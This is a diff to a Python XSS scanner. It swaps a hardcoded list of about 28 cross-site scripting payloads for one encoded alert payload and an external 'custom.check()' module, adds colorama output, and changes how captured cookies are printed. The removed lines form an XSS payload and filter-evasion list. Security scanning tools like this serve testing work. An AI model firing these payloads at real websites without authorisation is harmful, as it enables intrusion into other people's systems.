@@ -8,13 +8,22 @@ import urllib2
 from urllib2 import Request, build_opener, HTTPCookieProcessor, HTTPHandler
 import urllib
 from urllib import FancyURLopener
+import six.moves.http_cookiejar
 import socket
 import time
 import ssl
 import re
+import six.moves.http_cookiejar, optparse, random, string, urlparse
 import sys
+import six.moves.http_client
+import colorama
 import cookielib
-from functools import partial 
+from functools import partial
+import custom 
+from colorama import Fore, Back, Style
+from colorama import init
+from six.moves import input
+colorama.init()
 
 GET, POST = "GET", "POST"
 
@@ -60,34 +69,7 @@ def scan_page(url, data=None):
     dom = max(re.search(_, original) for _ in DOM_PATTERNS)
 
 ###Cross Site Scripting Payloads###
-xss_attack = ["%22%3Cscript%3Ealert%28%27dev%27%29%3C%2Fscript%3E"
-                            "<script>alert('dev')</script>",
-                            "1<ScRiPt >prompt(962477)</sCripT>",
-                            "<script>alert('dev')</script>",
-                            "'';!--\"<XSS>=&{()}",
-                            "<ScRipt>ALeRt('dev');</sCRipT>",
-                            "<body/onhashchange=alert(1)><a href=#>clickit",
-                            "<img src=x onerror=prompt(1);>",
-                            "%3cvideo+src%3dx+onerror%3dprompt(1)%3b%3e",
-                            "<iframesrc=\"javascript:alert(2)\">",
-                            "<iframe/src=\"data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">",
-                            "<form action=\"Javascript:alert(1)\"><input type=submit>",
-                            "<isindex action=data:text/html, type=image>",
-                            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=\">",
-                            "<svg/onload=prompt(1);>",
-                            "<marquee/onstart=confirm(2)>/",
-                            "<body onload=prompt(1);>",
-                            "<q/oncut=open()>",
-                            "<a onmouseover=location=’javascript:alert(1)>click",
-                            "<svg><script>alert&#40/1/&#41</script>",
-                            "&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
-                            "<scri%00pt>alert(1);</scri%00pt>",
-                            "<scri%00pt>confirm(0);</scri%00pt>",
-                            "5\x72\x74\x28\x30\x29\x3B'>rhainfosec",
-                            "<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>",
-                            "<marquee/onstart=confirm(2)>",
-                            "<A HREF=\"http://www.google.com./\">XSS</A>",
-                            "<svg/onload=prompt(1);>"]
+xss_attack = ["%22%3Cscript%3Ealert%28%27XSSYA%27%29%3C%2Fscript%3E"]
 
 
 class MyOpener(FancyURLopener):
@@ -245,11 +227,11 @@ if('2' in choice):
 
 
 ###Confirm by Searching Payload in Web Page###
-        heer = xss_attack
+        heer = custom.check()
         try:
             mam = myopener.open(host+exploi).read()
             found = False
-            for payload in heer:
+            for payload in heer.hit:
                 if payload in mam:
                     found = True
             if found:                
@@ -266,7 +248,6 @@ if('2' in choice):
                 time.sleep (3)
                 for cookie in cj:
                     print ("\033[1;32m==>\033[1;m", cookie)
-                    sys.exit()
             else:
                 print ("\033[1;31m[-] False Positive\033[1;m")
                 
